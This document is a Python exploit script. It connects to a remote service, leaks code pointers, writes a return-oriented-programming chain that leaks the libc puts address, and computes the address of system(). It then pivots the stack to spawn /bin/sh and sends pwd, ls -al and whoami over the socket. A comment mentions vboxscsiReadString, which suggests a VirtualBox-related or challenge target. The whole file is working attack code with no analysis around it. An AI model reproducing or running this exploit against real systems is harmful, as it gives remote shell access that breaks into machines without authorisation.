#!/usr/bin/env python3

import sys
import os
import socket
import time
import logging


global s

def readSockData(size):
    data = b''
    while( len(data) < size):
        data += s.recv(size - len(data))

    logging.debug('Received: ' + repr(data))

    return data

def writeSockData(data):
    s.send(data)
    logging.debug('Sent: ' + repr(data))


def leak_ptrs():
    logging.info("------ leak_ptrs ------")

    writeSockData(b'3\n')
    writeSockData(b'28\n')
    data = readSockData(2)

    writeSockData(b'2\n')
    writeSockData(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaa\n')
    data = readSockData(2)

    writeSockData(b'1\n')
    data = readSockData(28+2)


    writeSockData(b'3\n')
    writeSockData(b'28\n')
    data = readSockData(2)

    writeSockData(b'1\n')
    data = readSockData(28+2)


    addr1_A = bytearray(data[4:12])
    addr2_A = bytearray(data[20:28])

    addr1 = int.from_bytes(addr1_A,  byteorder='little', signed=False)
    addr2 = int.from_bytes(addr2_A,  byteorder='little', signed=False)

    return [addr1,addr2]


def setOperationSize(size):
    size_str = bytes(str(size), 'ascii')

    writeSockData(b'3\n')
    writeSockData(size_str + b'\n')
    data = readSockData(2)


def reset():
    writeSockData(b'4\n')
    data = readSockData(2)

# to call writeROP successfully Operation size has to be set to 8
# hexLen  = 6 to avoid sending first two \x00 bytes in adresses
def writeRop(wAddr, hexLen = 6): 
    waddr_str = wAddr.to_bytes(hexLen,'little') 

    writeSockData(b'2\n')
    writeSockData(waddr_str + b'\n')
    data = readSockData(2)

    writeSockData(b'1\n')
    data = readSockData(8 + 2)

def writeShellcode(addr1):
    logging.info("------ writeShellcode ------")
    setOperationSize(8)

#leak _puts function address by running write with buf arg pointing to _puts ptr position 
# in the .got table
    writeRop(addr1+0x506) # pop rdi ; ret
    writeRop(1, 1)    # fd = 1 ; ; hexLen = 1 to avoid sending \x00 bytes

#lucyly at this point  rdx is already set to 8

    writeRop(addr1+0x49A) # pop rsi ; retp
    writeRop(addr1+0x2D83) #puts address in got

    writeRop(addr1-0x1A5) # _write

#fgets1 "/bin/sh"
    writeRop(addr1+0x8F) #pop rbx ; mov rdx, qword ptr [rbx] ; ret
    writeRop(addr1+0x2E4B) #glibc_stdout


    writeRop(addr1+0x49A) # pop rsi ; retp
    writeRop(8, 1)        # n = 8 ; hexLen = 1 to avoid sending \x00 bytes


    writeRop(addr1+0x506) # pop rdi ; ret
    writeRop(addr1+0x2E5b) #bss after stdinGlibc plaaceholder


    writeRop(addr1-0x165) # fgets


#fgets2 "system_ptr"
    writeRop(addr1+0x8F) #pop rbx ; mov rdx, qword ptr [rbx] ; ret
    writeRop(addr1+0x2E4B) #glibc_stdout


    writeRop(addr1+0x49A) # pop rsi ; retp
    writeRop(8, 1)        # n = 8 ; hexLen = 1 to avoid sending \x00 bytes

    writeRop(addr1+0x506) # pop rdi ; ret
    writeRop(addr1+0x2E6a) #bss after stdinGlibc plaaceholder


    writeRop(addr1-0x165) # fgets


#jump to system
    writeRop(addr1+0x506) # pop rdi ; ret
    writeRop(addr1+0x2E5b) #bss after "/bin/sh

    writeRop(addr1-0x16) # pop rbp ; ret
    writeRop(addr1+0x2E6b - 0x48) #bss after stdinGlibc system pointer

    #lift the stack some more to make room for system to run
    writeRop(addr1+0x56) #ret 0x8b48

    writeRop(addr1-1) #call qword ptr [rbp + 0x48]


def writeFirstStage(addr_1):
    setOperationSize(8)
    writeSockData(b'1\n')
    data = readSockData(8 + 2) # shift 8

    setOperationSize(8)

    writeRop(addr_1 + 0x492) #sub_1687    stack pivot

    writeRop(addr_1 + 0x492 + 3) #sub_1687 + 3    stack lift

    setOperationSize(8)
    writeSockData(b'1\n')
    data = readSockData(8 + 2) #shift 8

    setOperationSize(8)

    handle_readOverwrite = addr_1 + 0x85 # sub_127A 

    writeSockData(b'2\n')
    writeSockData(handle_readOverwrite.to_bytes(6,'little') + b'\n'); #6 to avoid 0 bytes
    data = readSockData(2)

    #at this running [1] vboxscsiReadString  triggers rop 




def showUssage():
    print("Usage : " + os.path.basename(__file__) + " <ip> <port> <system_offset(optional)>")
    print("example: " + os.path.basename(__file__) + " 127.0.0.1 5555 0x2d7a0")
    print("example: " + os.path.basename(__file__) + " 127.0.0.1 5555")
    exit()

def main(args):

#    logging.basicConfig(level=logging.DEBUG)


    if(len(args) < 2):
        showUssage()

    HOST = args[0]
    PORT = int(args[1]);

    if len(args) > 2:
        system_offset = int(args[2],16)
    else:
        system_offset = None

    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(True)

    s.connect((HOST, PORT))


    data = s.recv(1024)
    logging.debug('Received: ', repr(data))

    input("Press Enter to continue...")

    print("------ leak_ptrs ------")
    [addr_1, addr_2] = leak_ptrs()
    print("handle_read ptr: 0x" + hex(addr_1)) # ofsets for rop are calculated from handle_read address

    print("handle_write ptr: 0x" + hex(addr_2))

    print("------ writeShellcode ------")
    writeShellcode(addr_1)
    print("------ reset ------")
    reset()
    print("------ writeFirstStage ------")
    writeFirstStage(addr_1)
    print("------ reset ------")
    reset()

    print("------ triggering ROP chain execution ------")
    writeSockData(b'1\n')  # trigger the ROP chain

    data = readSockData(8)

    puts_glibc_addr = int.from_bytes(data,  byteorder='little', signed=False)
    print("------ received puts address is " + hex(puts_glibc_addr) + " ------")

    if None == system_offset:
        sys_offset_str = input("Put offset from puts to system (in hex)\n")
        system_offset = int(sys_offset_str, 16)

    system_addr = puts_glibc_addr - system_offset
    print("------ system address is " + hex(system_addr) + " ------")

    print("------ Sending /bin/sh string ------")
    writeSockData(b'/bin/sh\x00')  #this is being received by read call on the other 
                                   #side. That's why string ends with \x00
    print("------ Sending system address ------")
    writeSockData(system_addr.to_bytes(6,'little') + b'\x00')

    sleep_time = 3
    print("------ Wait "+str(sleep_time)+"s for shell to spawn -----")
    time.sleep(sleep_time)


    print("------ sending commands ------")
    cmd = b'pwd\n'
    s.send(cmd)
    print('Sending:  ', repr(cmd))
    time.sleep(1)
    data = s.recv(1024)
    print('Received: ', repr(data))

    cmd = b'ls -al\n'
    s.send(cmd)
    print('Sending:  ', repr(cmd))
    time.sleep(1)
    data = s.recv(1024)
    print('Received: ', repr(data))

    cmd = b'whoami\n'
    s.send(cmd)
    print('Sending:  ', repr(cmd))
    time.sleep(1)
    data = s.recv(1024)
    print('Received: ', repr(data))

if __name__ == "__main__":
    # execute only if run as a script
    main(sys.argv[1:])

